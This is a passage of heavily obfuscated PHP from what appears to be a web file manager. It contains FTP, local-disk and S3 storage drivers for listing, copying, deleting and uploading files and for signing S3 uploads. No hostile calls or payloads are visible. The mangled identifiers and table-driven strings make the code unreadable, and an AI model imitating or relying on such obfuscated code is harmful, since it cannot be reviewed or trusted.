$¦‹Õ¶´º) { $­ãœúÒí[$¿¬ÊÕâ] = $this->folderInfo($¦‹Õ¶´º, $ïòœ¾²); } foreach ($”í÷†— as $¿¬ÊÕâ => $¦‹Õ¶´º) { $”í÷†—[$¿¬ÊÕâ] = $this->fileInfo($¦‹Õ¶´º[$†Å—¢Ï[32]], $ïòœ¾², $¦‹Õ¶´º); } return array($†Å—¢Ï[92] => $­ãœúÒí, $†Å—¢Ï[93] => $”í÷†—); } public function has($ÍŠ·şŒ², $Í¼Ÿ´ô† = false, $ºñ©ŒŞÙ = true) { $Ìüî£ˆİ =& $_SERVER[ñ÷§¡å]; $ íÄÙÏö = $“ ‰û’Õ = array(); $«§ıĞ›» = $Í¼Ÿ´ô† ? !0 : !1; $this->fileList($ÍŠ·şŒ², $ íÄÙÏö, $“ ‰û’Õ, $«§ıĞ›»); if ($Í¼Ÿ´ô†) { return array($Ìüî£ˆİ[217] => count($“ ‰û’Õ), $Ìüî£ˆİ[218] => count($ íÄÙÏö)); } if ($ºñ©ŒŞÙ) { if (count($“ ‰û’Õ)) { return !0; } } else { if (count($ íÄÙÏö)) { return !0; } } return !1; } public function listAll($ô§ŒŠÃ) { $¶èõ÷± =& $_SERVER[ñ÷§¡å]; if (!$this->_isconn()) { return !1; } $›ÊàÓ„† = $¼´€·šÒ = array(); $this->fileList($ô§ŒŠÃ, $›ÊàÓ„†, $¼´€·šÒ, !0); $ú¾Êãœ² = array(); foreach ($¼´€·šÒ as $ÔêâÃÓÒ) { $ú¾Êãœ²[$ÔêâÃÓÒ[$¶èõ÷±[32]]] = $ÔêâÃÓÒ[$¶èõ÷±[86]]; } foreach ($›ÊàÓ„† as $ÔêâÃÓÒ) { if (is_string($ÔêâÃÓÒ)) { $ú¾Êãœ²[$ÔêâÃÓÒ] = 0; } } return $this->listAllFiles($ô§ŒŠÃ, array_keys($ú¾Êãœ²), $ú¾Êãœ²); } public function getContent($°‘ÉÏäè) { if (!$this->_isconn()) { return !1; } $°‘ÉÏäè = $this->iconvSystem($°‘ÉÏäè); return $this->fileSubstr($°‘ÉÏäè); } public function setContent($³ÌŞÙôŒ, $Í—ûñÀ = '') { if (!$this->_isconn()) { return !1; } $¤Ø§ªÁ¼ = $this->pathThis($this->iconvSystem($³ÌŞÙôŒ)); $£É×øÙ = $this->tempFile($¤Ø§ªÁ¼); file_put_contents($£É×øÙ, $Í—ûñÀ); $âúÇØÕ½ = $this->upload($³ÌŞÙôŒ, $this->iconvApp($£É×øÙ)); $this->tempFileRemve($£É×øÙ); return $âúÇØÕ½; } public function fileSubstr($ŒÕÚ»Ëö, $šËã×”‘ = 0, $œ„«°õÇ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ŒÕÚ»Ëö, $šËã×”‘, $œ„«°õÇ); } private function ftpRequest($½¨ŞÀšÆ, $ÀñÏÔ•œ = 0, $çûùŞÈ¿ = false) { $½¨ŞÀšÆ = $this->iconvSystem($½¨ŞÀšÆ); $òÃÔ× = $this->scheme . $this->host . $_SERVER[ñ÷§¡å][4] . $this->port; $íÃ¬Š¢ù = curl_init(); curl_setopt($íÃ¬Š¢ù, CURLOPT_URL, $òÃÔ× . $this->pathEncode($½¨ŞÀšÆ)); curl_setopt($íÃ¬Š¢ù, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($çûùŞÈ¿) { $ñè ­‹ = $ÀñÏÔ•œ + $çûùŞÈ¿ - 1; curl_setopt($íÃ¬Š¢ù, CURLOPT_RANGE, "{$ÀñÏÔ•œ}\55{$ñè ­‹}"); } curl_setopt($íÃ¬Š¢ù, CURLOPT_RETURNTRANSFER, 1); $‚š¶¯£İ = curl_exec($íÃ¬Š¢ù); curl_close($íÃ¬Š¢ù); return $‚š¶¯£İ; } public function upload($Æ¸–š°Ú, $¤§Ÿ©çš, $¬ˆºçª• = false, $Ø“ÍˆÑò = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Æ¸–š°Ú))) { return !1; } $Æ¸–š°Ú = $this->iconvSystem($Æ¸–š°Ú); $¤§Ÿ©çš = $this->iconvSystem($¤§Ÿ©çš); $ØÏÍ©çÔ = ftp_nb_put($this->connect, $Æ¸–š°Ú, $¤§Ÿ©çš, FTP_BINARY); while ($ØÏÍ©çÔ == FTP_MOREDATA) { $ØÏÍ©çÔ = ftp_nb_continue($this->connect); } if ($ØÏÍ©çÔ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Æ¸–š°Ú); } public function download($–š„±, $ªèÄ¯¹£ = '') { if (!$this->_isconn()) { return !1; } $—ô›ÒÚ = $this->pathFather($ªèÄ¯¹£); if (!IO::mkdir($—ô›ÒÚ)) { return !1; } $–š„± = $this->iconvSystem($–š„±); $ªèÄ¯¹£ = $this->iconvSystem($ªèÄ¯¹£); $÷©îÃ³ = ftp_nb_get($this->connect, $ªèÄ¯¹£, $–š„±, FTP_BINARY); while ($÷©îÃ³ == FTP_MOREDATA) { $÷©îÃ³ = ftp_nb_continue($this->connect); } if ($÷©îÃ³ != FTP_FINISHED) { return !1; } return $this->iconvApp($ªèÄ¯¹£); } public function exist($ñôÕ®ÅÒ) { return $this->isFile($ñôÕ®ÅÒ) || $this->isFolder($ñôÕ®ÅÒ); } public function isFile($”©ê“ƒ…) { return !$this->isFolder($”©ê“ƒ…) && $this->objectMeta($”©ê“ƒ…); } public function isFolder($Ç»îµîï) { return $this->cacheMethod($_SERVER[ñ÷§¡å][175], $Ç»îµîï); } protected function objectMeta($áÍî½›) { return $this->cacheMethod($_SERVER[ñ÷§¡å][177], $áÍî½›); } protected function _objectMeta($ŞĞë¢±â) { $ëø‚ª¹ù =& $_SERVER[ñ÷§¡å]; if ($ŞĞë¢±â == $ëø‚ª¹ù[12] || $ŞĞë¢±â == $ëø‚ª¹ù[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ŞĞë¢±â = $this->iconvSystem($ŞĞë¢±â); $ÑññÄû¢ = array($ëø‚ª¹ù[32] => $this->iconvApp($ŞĞë¢±â), $ëø‚ª¹ù[33] => $ëø‚ª¹ù[209], $ëø‚ª¹ù[86] => 0); @ftp_chdir($this->connect, $ëø‚ª¹ù[8]); $ŸˆÉòÆ° = @ftp_size($this->connect, $ŞĞë¢±â); if ($ŸˆÉòÆ° != -1) { $ÑññÄû¢[$ëø‚ª¹ù[86]] = $ŸˆÉòÆ°; } else { $…Úãîç© = @ftp_chdir($this->connect, $ŞĞë¢±â); if (!$…Úãîç©) { return !1; } $ÑññÄû¢[$ëø‚ª¹ù[33]] = $ëø‚ª¹ù[85]; } return $ÑññÄû¢; } protected function _isFolder($øÙ”º¼) { $¤÷˜–öƒ =& $_SERVER[ñ÷§¡å]; if ($øÙ”º¼ == $¤÷˜–öƒ[12] || $øÙ”º¼ == $¤÷˜–öƒ[8]) { return !0; } $‡ò¼°ì‹ = $this->_objectMeta($øÙ”º¼); return isset($‡ò¼°ì‹[$¤÷˜–öƒ[33]]) && $‡ò¼°ì‹[$¤÷˜–öƒ[33]] == $¤÷˜–öƒ[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ŸÕŠ­ÌÔ) { if (substr($ŸÕŠ­ÌÔ, 0, 2) == $_SERVER[ñ÷§¡å][1374]) { $ŸÕŠ­ÌÔ = BASIC_PATH . substr($ŸÕŠ­ÌÔ, 2); } return $ŸÕŠ­ÌÔ; } public function iconvApp($­÷Ñî÷½) { $áÜƒœìò =& $_SERVER[ñ÷§¡å]; global $config; return $this->iconvTo($­÷Ñî÷½, $config[$áÜƒœìò[1372]], $config[$áÜƒœìò[1371]]); } public function iconvSystem($Î‰›ï—) { $¼Èø¿Ç  =& $_SERVER[ñ÷§¡å]; global $config; return $this->iconvTo($Î‰›ï—, $config[$¼Èø¿Ç [1371]], $config[$¼Èø¿Ç [1372]]); } public function getPathOuter($€×‰Ş¦) { $à°×ô¼ñ =& $_SERVER[ñ÷§¡å]; $ê£¥¿éË = $this->iconvApp($this->pathBase); $€×‰Ş¦ = $this->iconvApp($€×‰Ş¦); if (substr($ê£¥¿éË, 0, 2) == $à°×ô¼ñ[1374]) { $ê£¥¿éË = BASIC_PATH . substr($ê£¥¿éË, 2); } if (substr($€×‰Ş¦, 0, 2) == $à°×ô¼ñ[1374]) { $€×‰Ş¦ = BASIC_PATH . substr($€×‰Ş¦, 2); } $ê£¥¿éË = KodIO::clear($ê£¥¿éË); $€×‰Ş¦ = KodIO::clear($€×‰Ş¦); $€×‰Ş¦ = substr($€×‰Ş¦, strlen($ê£¥¿éË)); if (empty($this->pathDriver)) { return $€×‰Ş¦; } return $this->pathDriver . $à°×ô¼ñ[8] . ltrim($€×‰Ş¦, $à°×ô¼ñ[8]); } public function mkfile($éçäœĞ, $ŒÏìæ–¤ = '', $Œ“Ê†”™ = REPEAT_RENAME) { $éçäœĞ = $this->iconvSystem($éçäœĞ); @touch($éçäœĞ); if ($ŒÏìæ–¤) { file_put_contents($éçäœĞ, $ŒÏìæ–¤); } @chmod($éçäœĞ, $this->pathAuth); return is_file($éçäœĞ) ? $this->getPathOuter($éçäœĞ) : !1; } public function mkdir($‘à´¤×¯, $Ö³»ËÈ = REPEAT_SKIP) { $‘à´¤×¯ = $this->iconvSystem($‘à´¤×¯); if (is_dir($‘à´¤×¯)) { return $this->getPathOuter($‘à´¤×¯); } @mkdir($‘à´¤×¯, $this->pathAuth, !0); @chmod($‘à´¤×¯, $this->pathAuth); return is_dir($‘à´¤×¯) ? $this->getPathOuter($‘à´¤×¯) : !1; } public function copyFile($Œ°â‰‚ê, $šÎ°¸ó”) { $this->mkdir($this->pathFather($šÎ°¸ó”)); $Œ°â‰‚ê = $this->iconvSystem($Œ°â‰‚ê); $šÎ°¸ó” = $this->iconvSystem($šÎ°¸ó”); $Õò”Æ£’ = copy_64($Œ°â‰‚ê, $šÎ°¸ó”); @chmod($šÎ°¸ó”, $this->pathAuth); return $Õò”Æ£’ ? $this->getPathOuter($šÎ°¸ó”) : !1; } public function moveFile($ì“ºÊèÏ, $”ã¨¯”Í) { $this->mkdir($this->pathFather($”ã¨¯”Í)); $ì“ºÊèÏ = $this->iconvSystem($ì“ºÊèÏ); $”ã¨¯”Í = $this->iconvSystem($”ã¨¯”Í); $íñà£´ = intval(@rename($ì“ºÊèÏ, $”ã¨¯”Í)); if (!$íñà£´) { if ($íñà£´ = intval(@copy_64($ì“ºÊèÏ, $”ã¨¯”Í))) { @unlink($ì“ºÊèÏ); } } @chmod($”ã¨¯”Í, $this->pathAuth); return $íñà£´ ? $this->getPathOuter($”ã¨¯”Í) : !1; } public function movePath($Õ†‚–äÁ, $ş€´¦ï‚, $ëßüÆ‰İ = false) { $§Ãº­¶Ğ =& $_SERVER[ñ÷§¡å]; $Õ†‚–äÁ = $this->iconvSystem($Õ†‚–äÁ); $ş€´¦ï‚ = $this->iconvSystem($ş€´¦ï‚); $‘–×ëÆŠ = rtrim($ş€´¦ï‚, $§Ãº­¶Ğ[8]) . $§Ãº­¶Ğ[8] . ($ëßüÆ‰İ ? $ëßüÆ‰İ : get_path_this($Õ†‚–äÁ)); if (file_exists($‘–×ëÆŠ)) { return !1; } $ªÏå„á = intval(@rename($Õ†‚–äÁ, $‘–×ëÆŠ)); $ªÏå„á = file_exists($‘–×ëÆŠ); return $ªÏå„á ? $this->getPathOuter($‘–×ëÆŠ) : !1; } public function delFile($Íæ•èâÈ) { $Íæ•èâÈ = $this->iconvSystem($Íæ•èâÈ); if (!@unlink($Íæ•èâÈ)) { @chmod($Íæ•èâÈ, $this->pathAuth); if (!@unlink($Íæ•èâÈ)) { return !1; } } else { return !0; } } public function delFolder($Ãæ”•Ëñ) { $ÕÙ›ÉÀà =& $_SERVER[ñ÷§¡å]; $Ãæ”•Ëñ = $this->iconvSystem($Ãæ”•Ëñ); if (!is_dir($Ãæ”•Ëñ)) { return !0; } if (!($Í¬ñ¸º = opendir($Ãæ”•Ëñ))) { return !1; } while (($›üÇ™ËÃ = readdir($Í¬ñ¸º)) !== !1) { if ($›üÇ™ËÃ == $ÕÙ›ÉÀà[10] || $›üÇ™ËÃ == $ÕÙ›ÉÀà[1381]) { continue; } $ÖëŸ¢ = $Ãæ”•Ëñ . $ÕÙ›ÉÀà[8] . $›üÇ™ËÃ; if (is_file($ÖëŸ¢) || is_link($ÖëŸ¢)) { if (!unlink($ÖëŸ¢)) { chmod($ÖëŸ¢, $this->pathAuth); if (!unlink($ÖëŸ¢)) { return !1; } } } else { if (is_dir($ÖëŸ¢)) { chmod($ÖëŸ¢, $this->pathAuth); $ÖëŸ¢ = $this->iconvApp($ÖëŸ¢); if (!$this->delFolder($ÖëŸ¢)) { return !1; } } } } closedir($Í¬ñ¸º); return rmdir($Ãæ”•Ëñ); } public function rename($ÜØö¡ÙË, $ô‚ÍáÚ¿) { $ÛçúÚò± =& $_SERVER[ñ÷§¡å]; $á¼¦óÃ = $this->fileNameAuto($this->pathFather($ÜØö¡ÙË), $ô‚ÍáÚ¿); $á¼¦óÃ = $this->iconvSystem($á¼¦óÃ); $ÜØö¡ÙË = $this->iconvSystem($ÜØö¡ÙË); $­é—¹ªŸ = $this->pathFather($ÜØö¡ÙË); $Ç—ÍÅÁ = rtrim($­é—¹ªŸ, $ÛçúÚò±[8]) . $ÛçúÚò±[8] . $á¼¦óÃ; $Ş†Á—¿Â = @rename($ÜØö¡ÙË, $Ç—ÍÅÁ); $Ç—ÍÅÁ = $this->iconvApp($Ç—ÍÅÁ); return $Ş†Á—¿Â ? $this->getPathOuter($Ç—ÍÅÁ) : !1; } public function size($ô™£èƒ´) { $ô™£èƒ´ = $this->iconvSystem($ô™£èƒ´); return filesize_64($ô™£èƒ´); } public function info($Ùµ„¶á£) { $Ùµ„¶á£ = $this->iconvSystem($Ùµ„¶á£); if ($this->isFolder($Ùµ„¶á£)) { return $this->folderInfo($Ùµ„¶á£); } else { if ($this->isFile($Ùµ„¶á£)) { return $this->fileInfo($Ùµ„¶á£); } } return !1; } protected function infoChildren($ƒã¢½’º, &$ÚŸ‰Ì¹, $³Ÿü–Ô± = true) { $áÚ•±ô =& $_SERVER[ñ÷§¡å]; check_abort_echo(); $ƒã¢½’º = rtrim($ƒã¢½’º, $áÚ•±ô[8]) . $áÚ•±ô[8]; if ($³Ÿü–Ô±) { $ƒã¢½’º = $this->iconvSystem($ƒã¢½’º); } if (!($âñæ¬ø = @opendir($ƒã¢½’º))) { return; } while (($¤‡¬Ÿë = readdir($âñæ¬ø)) !== !1) { if ($¤‡¬Ÿë == $áÚ•±ô[10] || $¤‡¬Ÿë == $áÚ•±ô[1381]) { continue; } $ğÆô¡êµ = $ƒã¢½’º . $¤‡¬Ÿë; if (is_file($ğÆô¡êµ) || is_link($ğÆô¡êµ)) { $ÚŸ‰Ì¹[$áÚ•±ô[87]]++; $ÚŸ‰Ì¹[$áÚ•±ô[86]] += filesize_64($ğÆô¡êµ); } else { if (is_dir($ğÆô¡êµ)) { $ÚŸ‰Ì¹[$áÚ•±ô[88]]++; $this->infoChildren($ğÆô¡êµ, $ÚŸ‰Ì¹, !1); } } } closedir($âñæ¬ø); } private function folderInfo($ê‘õ„ï•, $Äó§À• = false) { $îœÖ¨Šõ =& $_SERVER[ñ÷§¡å]; $ê‘õ„ï• = rtrim($ê‘õ„ï•, $îœÖ¨Šõ[8]) . $îœÖ¨Šõ[8]; $Éİ€±„ = $this->iconvApp($this->pathThis($ê‘õ„ï•)); if ($Äó§À•) { return array($îœÖ¨Šõ[32] => $Éİ€±„, $îœÖ¨Šõ[94] => $this->getPathOuter($ê‘õ„ï•), $îœÖ¨Šõ[33] => $îœÖ¨Šõ[85]); } $©şÕØø§ = array($îœÖ¨Šõ[32] => $Éİ€±„, $îœÖ¨Šõ[94] => $this->getPathOuter($ê‘õ„ï•), $îœÖ¨Šõ[33] => $îœÖ¨Šõ[85], $îœÖ¨Šõ[210] => @filectime($ê‘õ„ï•), $îœÖ¨Šõ[95] => @filemtime($ê‘õ„ï•), $îœÖ¨Šõ[1384] => @fileatime($ê‘õ„ï•), $îœÖ¨Šõ[1385] => is_readable($ê‘õ„ï•), $îœÖ¨Šõ[1386] => is_writable($ê‘õ„ï•), $îœÖ¨Šõ[1387] => get_mode($ê‘õ„ï•)); return $©şÕØø§; } private function fileInfo($¼Û°İ‰ß, $œ Â½ = false) { $ĞöçÑŒô =& $_SERVER[ñ÷§¡å]; $Õ‘á®‹› = $this->iconvApp($this->pathThis($¼Û°İ‰ß)); if ($œ Â½) { return array($ĞöçÑŒô[32] => $Õ‘á®‹›, $ĞöçÑŒô[94] => $this->getPathOuter($¼Û°İ‰ß), $ĞöçÑŒô[33] => $ĞöçÑŒô[209], $ĞöçÑŒô[86] => $this->size($¼Û°İ‰ß), $ĞöçÑŒô[184] => $this->ext($Õ‘á®‹›)); } $‡€íàÖ‚ = array($ĞöçÑŒô[32] => $Õ‘á®‹›, $ĞöçÑŒô[94] => $this->getPathOuter($¼Û°İ‰ß), $ĞöçÑŒô[33] => $ĞöçÑŒô[209], $ĞöçÑŒô[210] => @filectime($¼Û°İ‰ß), $ĞöçÑŒô[95] => @filemtime($¼Û°İ‰ß), $ĞöçÑŒô[1384] => @fileatime($¼Û°İ‰ß), $ĞöçÑŒô[86] => $this->size($¼Û°İ‰ß), $ĞöçÑŒô[184] => $this->ext($Õ‘á®‹›), $ĞöçÑŒô[1385] => is_readable($¼Û°İ‰ß), $ĞöçÑŒô[1386] => is_writable($¼Û°İ‰ß), $ĞöçÑŒô[1387] => get_mode($¼Û°İ‰ß)); return $‡€íàÖ‚; } public function exist($›ı›îº¾) { $›ı›îº¾ = $this->iconvSystem($›ı›îº¾); return @file_exists($›ı›îº¾); } public function isFile($÷ØÅÑø) { $÷ØÅÑø = $this->iconvSystem($÷ØÅÑø); return @is_file($÷ØÅÑø); } public function isFolder($ñ•©Öô) { $ñ•©Öô = $this->iconvSystem($ñ•©Öô); return @is_dir($ñ•©Öô); } public function listPath($êĞöÍ¶Å, $Ååƒ±‘Ë = false) { $€‚¿ñÍÆ =& $_SERVER[ñ÷§¡å]; $êĞöÍ¶Å = $this->iconvSystem($êĞöÍ¶Å); $êĞöÍ¶Å = rtrim($êĞöÍ¶Å, $€‚¿ñÍÆ[8]) . $€‚¿ñÍÆ[8]; $Á’ÚÓ‡â = array($€‚¿ñÍÆ[92] => array(), $€‚¿ñÍÆ[93] => array()); if (!($ÓÌ‹÷¨œ = @opendir($êĞöÍ¶Å))) { return $Á’ÚÓ‡â; } while (($ıš¬¼Û™ = readdir($ÓÌ‹÷¨œ)) !== !1) { if ($ıš¬¼Û™ == $€‚¿ñÍÆ[10] || $ıš¬¼Û™ == $€‚¿ñÍÆ[1381]) { continue; } $ˆß¼ñş€ = $êĞöÍ¶Å . $ıš¬¼Û™; if (is_file($ˆß¼ñş€)) { $Á’ÚÓ‡â[$€‚¿ñÍÆ[93]][] = $this->fileInfo($ˆß¼ñş€, $Ååƒ±‘Ë); } else { $Á’ÚÓ‡â[$€‚¿ñÍÆ[92]][] = $this->folderInfo($ˆß¼ñş€, $Ååƒ±‘Ë); } } closedir($ÓÌ‹÷¨œ); return $Á’ÚÓ‡â; } public function listAll($¾ÃŞÆêĞ, &$Ä™‚®­´ = array()) { $ãÛß·” =& $_SERVER[ñ÷§¡å]; $¾ÃŞÆêĞ = $this->iconvSystem($¾ÃŞÆêĞ); $¾ÃŞÆêĞ = rtrim($¾ÃŞÆêĞ, $ãÛß·”[8]) . $ãÛß·”[8]; if (!($î’â‘×‹ = @opendir($¾ÃŞÆêĞ))) { return $Ä™‚®­´; } while (($—É½˜¼æ = readdir($î’â‘×‹)) !== !1) { if ($—É½˜¼æ == $ãÛß·”[10] || $—É½˜¼æ == $ãÛß·”[1381]) { continue; } $Ç¿£À¦¨ = $¾ÃŞÆêĞ . $—É½˜¼æ; if (is_dir($Ç¿£À¦¨) && !is_link($Ç¿£À¦¨)) { $Ä™‚®­´[] = array($ãÛß·”[94] => $Ç¿£À¦¨ . $ãÛß·”[8], $ãÛß·”[85] => 1, $ãÛß·”[95] => @filemtime($Ç¿£À¦¨), $ãÛß·”[86] => 0); $this->listAll($Ç¿£À¦¨, $Ä™‚®­´); } else { $Ä™‚®­´[] = array($ãÛß·”[94] => $Ç¿£À¦¨, $ãÛß·”[85] => 0, $ãÛß·”[95] => @filemtime($Ç¿£À¦¨), $ãÛß·”[86] => $this->size($Ç¿£À¦¨)); } } closedir($î’â‘×‹); return $Ä™‚®­´; } public function has($ ÈÂ¢¾·, $µç¢ˆÉ­ = false, $Ã‹ÔìÉ® = true) { $úäû½â£ =& $_SERVER[ñ÷§¡å]; $ ÈÂ¢¾· = $this->iconvSystem($ ÈÂ¢¾·); $ ÈÂ¢¾· = rtrim($ ÈÂ¢¾·, $úäû½â£[8]) . $úäû½â£[8]; if (!($öüÙÜ‰ = @opendir($ ÈÂ¢¾·))) { return !1; } $ÕÃ¼íÎƒ = 0; $º¿áŞ—Ô = 0; $Ûí¬ûª¤ = 0; while (($„¼àƒ¢¢ = readdir($öüÙÜ‰)) !== !1) { if ($„¼àƒ¢¢ == $úäû½â£[10] || $„¼àƒ¢¢ == $úäû½â£[1381]) { continue; } $Ö—¿Şé’ = $ ÈÂ¢¾· . $„¼àƒ¢¢; if ($µç¢ˆÉ­) { $Ûí¬ûª¤++; if (@is_file($Ö—¿Şé’)) { $ÕÃ¼íÎƒ++; } else { $º¿áŞ—Ô++; } if ($Ûí¬ûª¤ > 10000) { break; } continue; } if ($Ã‹ÔìÉ®) { if (@is_file($Ö—¿Şé’)) { return !0; } } else { if (@is_dir($Ö—¿Şé’ . $úäû½â£[8])) { return !0; } } } closedir($öüÙÜ‰); if ($µç¢ˆÉ­) { return array($úäû½â£[217] => $ÕÃ¼íÎƒ, $úäû½â£[218] => $º¿áŞ—Ô); } return !1; } public function hashSimple($­»½âÕ) { $Àƒ‹Ôù“ =& $_SERVER[ñ÷§¡å]; if (!$­»½âÕ) { return md5($Àƒ‹Ôù“[12]); } $­»½âÕ = $this->iconvSystem($­»½âÕ); $ĞšƒÚş¤ = $this->size($­»½âÕ); $–å¾û¯ = 200; $î†ØŞ€Ê = 50; if ($ĞšƒÚş¤ <= $–å¾û¯ * $î†ØŞ€Ê) { return $this->hashMd5($­»½âÕ) . $ĞšƒÚş¤; } $é°Ø­û– = $Àƒ‹Ôù“[12]; $óû÷× = intval($ĞšƒÚş¤ / $î†ØŞ€Ê); $Ö÷‘Ÿ„ = fopen($­»½âÕ, $Àƒ‹Ôù“[1388]); if (!$Ö÷‘Ÿ„) { return $é°Ø­û–; } for ($¾‰óœ´ˆ = 0; $¾‰óœ´ˆ < $î†ØŞ€Ê; $¾‰óœ´ˆ++) { fseek_64($Ö÷‘Ÿ„, $óû÷× * $¾‰óœ´ˆ); $é°Ø­û– .= fread($Ö÷‘Ÿ„, $–å¾û¯); } fseek_64($Ö÷‘Ÿ„, $ĞšƒÚş¤ - $–å¾û¯); $é°Ø­û– .= fread($Ö÷‘Ÿ„, $–å¾û¯); fclose($Ö÷‘Ÿ„); return md5($é°Ø­û–) . $ĞšƒÚş¤; } public function getContent($áı«ŒÎû) { $áı«ŒÎû = $this->iconvSystem($áı«ŒÎû); return file_get_contents($áı«ŒÎû); } public function setContent($ê³…Şš¾, $œÄ«¡† = '') { $ê³…Şš¾ = $this->iconvSystem($ê³…Şš¾); $ÒŸÛ„ŠÌ = @file_put_contents($ê³…Şš¾, $œÄ«¡†, LOCK_EX); clearstatcache(); @chmod($ê³…Şš¾, $this->pathAuth); return $ÒŸÛ„ŠÌ === !1 ? !1 : !0; } public function fileSubstr($³µéñóÉ, $°ô…¦Şè = 0, $¯Óù“ = false) { $£¦§û¥Ó =& $_SERVER[ñ÷§¡å]; $³µéñóÉ = $this->iconvSystem($³µéñóÉ); if ($¯Óù“ === !1) { $¯Óù“ = $this->size($³µéñóÉ); } if ($¯Óù“ <= 0) { return $£¦§û¥Ó[12]; } $ÑŠéÙ = fopen($³µéñóÉ, $£¦§û¥Ó[1388]); if (!$ÑŠéÙ) { return !1; } fseek_64($ÑŠéÙ, $°ô…¦Şè); $ÂËæ¾¡Î = fread($ÑŠéÙ, $¯Óù“); fclose($ÑŠéÙ); return $ÂËæ¾¡Î; } public function upload($öû—ŸÓ„, $í÷Â÷è¿, $Ïƒ¬§ˆÒ = false, $™à“ÃÚ = REPEAT_REPLACE) { if ($Ïƒ¬§ˆÒ) { return $this->moveFile($í÷Â÷è¿, $öû—ŸÓ„); } return $this->copyFile($í÷Â÷è¿, $öû—ŸÓ„); } public function setModifyTime($°É·ñ¦, $åÁ¬Ó¶ = '') { @touch($°É·ñ¦, intval($åÁ¬Ó¶)); } public function download($£ÜÈ‚ô™, $µç„®‰ğ) { return $this->iconvSystem($£ÜÈ‚ô™); } } goto Dİò¡È›é–; F­ïİÛ²øµ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ñÇù Ó) { parent::__construct($ñÇù Ó); } public function uploadFormData($Ÿ©¿ÓªÒ, $¢›ş£Š = 3600) { $Ïó¹Å­í =& $_SERVER[ñ÷§¡å]; $¶È– “¯ = $Ïó¹Å­í[208]; $ÉÌÍËÂÂ = $Ïó¹Å­í[1353]; $÷öİşÓ = $Ïó¹Å­í[72]; $ÕØ€Ç¹ = gmdate($Ïó¹Å­í[1354]); $‚òùú = gmdate($Ïó¹Å­í[764]); $œŞû×Ÿ = $Ïó¹Å­í[1355]; $Ğ–òÙíÁ = $¢›ş£Š . $Ïó¹Å­í[12]; $©ßºÂ‰š = $Ïó¹Å­í[1317]; $×ÎïÔ§û = array($this->accessKey, $‚òùú, $this->region, $÷öİşÓ, $œŞû×Ÿ); $£™×­±’ = implode($Ïó¹Å­í[8], $×ÎïÔ§û); $Í¦Îœë¸ = array($Ïó¹Å­í[1319] => gmdate($Ïó¹Å­í[1318], strtotime($Ïó¹Å­í[1356])), $Ïó¹Å­í[1320] => array(array($Ïó¹Å­í[1322] => $this->bucket), array($Ïó¹Å­í[1321] => $¶È– “¯), array($Ïó¹Å­í[1323], $Ïó¹Å­í[1324], $Ïó¹Å­í[12]), array($Ïó¹Å­í[1323], $Ïó¹Å­í[1357], $Ïó¹Å­í[12]), array($Ïó¹Å­í[1323], $Ïó¹Å­í[1358], $Ïó¹Å­í[12]), array($Ïó¹Å­í[1325] => $©ßºÂ‰š), array($Ïó¹Å­í[1359] => $£™×­±’), array($Ïó¹Å­í[1360] => $ÉÌÍËÂÂ), array($Ïó¹Å­í[1361] => $ÕØ€Ç¹), array($Ïó¹Å­í[1362] => $Ğ–òÙíÁ))); $¬³úÃÕ¸ = base64_encode(json_encode($Í¦Îœë¸)); $’ à´Ÿø = hash_hmac($Ïó¹Å­í[1363], $‚òùú, $Ïó¹Å­í[1364] . $this->secret, !0); $õŞ¡ÍÆ = hash_hmac($Ïó¹Å­í[1363], $this->region, $’ à´Ÿø, !0); $­Ô­’ = hash_hmac($Ïó¹Å­í[1363], $÷öİşÓ, $õŞ¡ÍÆ, !0); $ŒŒ¯ˆ = hash_hmac($Ïó¹Å­í[1363], $œŞû×Ÿ, $­Ô­’, !0); $¼ëáÏòƒ = hash_hmac($Ïó¹Å­í[1363], $¬³úÃÕ¸, $ŒŒ¯ˆ); $§½šÀ­ı = array($Ïó¹Å­í[225] => $Ïó¹Å­í[12], $Ïó¹Å­í[1365] => $Ïó¹Å­í[12], $Ïó¹Å­í[1321] => $¶È– “¯, $Ïó¹Å­í[1325] => $©ßºÂ‰š, $Ïó¹Å­í[1329] => $¬³úÃÕ¸, $Ïó¹Å­í[1366] => $£™×­±’, $Ïó¹Å­í[1367] => $ÉÌÍËÂÂ, $Ïó¹Å­í[1368] => $ÕØ€Ç¹, $Ïó¹Å­í[1369] => $Ğ–òÙíÁ, $Ïó¹Å­í[1370] => $¼ëáÏòƒ, $Ïó¹Å­í[191] => $this->getHost()); return $§½šÀ­ı; } public function multiUploadFormData($õ¿ˆô¸, $„ÉúÌË = 3600) { $íÃöâ¶Í =& $_SERVER[ñ÷§¡å]; $×ù´á‡î = gmdate($íÃöâ¶Í[1449]); $ÏÂĞÁÌ³ = array(); $¶Õ½˜êü = $this->client->getUploadId($this->bucket, $õ¿ˆô¸, $ÏÂĞÁÌ³); if (!$¶Õ½˜êü) { return !1; } return array($íÃöâ¶Í[233] => $¶Õ½˜êü, $íÃöâ¶Í[191] => $this->getHost() . $íÃöâ¶Í[8] . $this->pathEncode($õ¿ˆô¸), $íÃöâ¶Í[234] => $×ù´á‡î, $íÃöâ¶Í[104] => $õ¿ˆô¸); } public function multiUploadAuthData($ù‘»…ª¸, $Á¿ìú«ß = array()) { $ŞÚÄáºÊ =& $_SERVER[ñ÷§¡å]; $¸ÉÑëˆŠ = isset($Á¿ìú«ß[$ŞÚÄáºÊ[184]]) ? $Á¿ìú«ß[$ŞÚÄáºÊ[184]] : $ŞÚÄáºÊ[12]; $¹÷›®Ğ’ = $Á¿ìú«ß[$ŞÚÄáºÊ[104]]; unset($Á¿ìú«ß[$ŞÚÄáºÊ[104]]); if (isset($Á¿ìú«ß[$ŞÚÄáºÊ[235]])) { return $this->listUploadParts($¹÷›®Ğ’, $Á¿ìú«ß); } $‚‚ŒœáÁ = array(); if (isset($Á¿ìú«ß[$ŞÚÄáºÊ[1450]])) { $‚‚ŒœáÁ[$ŞÚÄáºÊ[1451]] = $Á¿ìú«ß[$ŞÚÄáºÊ[1450]]; } $ÖÑáŞ = explode($ŞÚÄáºÊ[193], $this->getHost()); $ï’éôèì = array($ŞÚÄáºÊ[1452] => $ÖÑáŞ[1], 